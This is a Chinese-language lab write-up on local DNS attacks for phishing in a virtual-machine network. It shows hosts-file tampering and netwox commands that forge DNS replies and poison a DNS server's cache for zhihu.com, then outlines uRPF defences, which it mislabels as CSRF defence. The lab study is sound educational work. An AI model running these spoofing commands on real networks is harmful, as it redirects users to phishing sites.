## 钓鱼网站本地DNS攻击

### 当你浏览器中敲下知乎域名电脑做了什么?
- 访问网站概述
1.解析URL  
2.DNS查询  
2.1.查询本地浏览器DNS缓存  
```
chrome://net-internals/#dns
firefox: about:config
```
2.2.查询本地hosts文件  
```
/etc/hosts
```
2.3.查询本地DNS服务器  
2.4.查询上级DNS服务器  
- DNS协议概述

DNS(Domain Name System)通俗的讲就是手机号码和姓名备注的系统.  
比如我自己的黑客笔记  
域名是:hackbiji.top(http://isgt93.github.io)  
IP地址:192.30.252.154  
你更愿意选择输入什么?DNS就是将IP地址和域名对应起来的!  

- 为什么黑客能通过DNS协议钓鱼
DNS欺骗原理:
![DNS欺骗](https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/DNS_Local/DNS_Spoof.png)

DNS缓存中毒原理:
![DNS中毒](https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/DNS_Local/DNS_Spoof.png)
### 攻击环境配置
- 虚拟机各主机地址
```
攻击者:192.168.59.1
普通用户:192.168.59.146
DNS服务器:192.168.59.151
```
- DNS服务器环境配置
1. 安装bind9
2. 在`/etc/bind/named.conf.options`文件中添加:
```
options {
dump-file "/var/cache/bind/dump.db";
};
```
3. 添加文件`/var/cache/bind/example.com.db`,内容如下:
```
$TTL 3D
@	IN	SOA	ns.example.com. admin.example.com. (
		2008111001
		8H
		2H
		4W
		1D)

@	IN	NS	ns.example.com.
@	IN	MX	10 mail.example.com.

www	IN	A	192.168.59.151
mail	IN	A	192.168.59.151
ns	IN	A	192.168.59.151
*.example.com.	IN	A 192.168.59.151

```
4. 添加文件`192.168.59 `,内容如下:
```
$TTL 3D
@	IN	SOA	ns.example.com. admin.example.com. (
		2008111001
		8H
		2H
		4W
		1D)
@	IN	NS	ns.example.com.

151	IN	PTR	www.example.com.
151	IN	PTR	mail.example.com.
151	IN	PTR	ns.example.com.

```
5. 重启服务`service bind9 restart`.

- 普通用户环境配置
1. 编辑`/etc/resolv.conf`文件的`nameserver`字段为DNS服务器IP地址.
2. `ping www.example.com`能ping通则说明配置成功!
3. 通过nslookup查看`www.example.com`的IP地址为`192.168.59.151`.
```
root@ubuntu:/etc/bind# nslookup www.example.com
Server:		127.0.1.1
Address:	127.0.1.1#53

Name:	www.example.com
Address: 192.168.59.151
```
### 攻击DNS协议
- 不要让黑客接触你的电脑,他会做什么?
黑客会在`\etc\hosts`文件中添加下面的字段,将网址强行映射到一个错误的IP地址!  
```
192.168.59.151	zhihu.com
192.168.59.151	www.zhihu.com
```
实际效果如图所示:  
![zhihu](https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/DNS_Local/zhihu.com.png)

- 不要相信黑客伪造的DNS应答报文,他怎么伪造的?

```
netwox 105 -h "zhihu.com" -H "192.168.59.151" -a "ns.example.com" -A "192.168.59.151" -f "src host 192.168.59.146" -d vmnet8 -T 10
```
欺骗浏览器,告诉浏览器`zhihu.com`的IP地址是`192.168.59.151`,而这个错误的IP地址往往就是钓鱼网站!  

实际效果如图所示:  
![seed](https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/DNS_Local/seed.png)

- 小心把控DNS服务器Cache时间,严防DNS Cache中毒!

```
netwox 105 -h "www.zhihu.com" -H "192.168.59.152" -a "ns.example.com" -A "192.168.59.152" -f "src host 192.168.59.152" -d vmnet8 -s "raw"
```
实际效果如图所示:

![zhihu_dig](https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/DNS_Local/zhihu_dig.png)

来看看咱们的DNS服务器缓存
```
# rndc flush
# rndc dumpdb -cache
# cat /var/cache/bind/dump.db | grep zhihu
```
![zhihu_cache](https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/DNS_Local/zhihu_cache.png)

### 如何防御DNS攻击?

1. 平时注意不要相信陌生人的电话
2. 技术层面的CSRF防御

严格模式有 2 个条件,只有同时满足两个条件的报文,才会被检测通过.  
> 条件 1:在路由器转发表中,存在去往报文源地址的路由信息.  
> 条件 2:报文的入接口与转发表中去往源地址路由的出接口一致.  

在Router C 上配置严格型 URPF,当攻击者伪装源地址为 Normal User 地址,  
报文由 RA 接口进入 Router C,由于在 Router C 的转发表中,  
去往源地址Normal User 的路由出接口为 RB,而伪造报文的入接口为 RA,  
该伪造报文在Router C 上直接丢弃,并且在对称路由中 Normal User 可以正常访问 Server.  

如图所示:

![csrf](https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/DNS_Local/csrf.png)
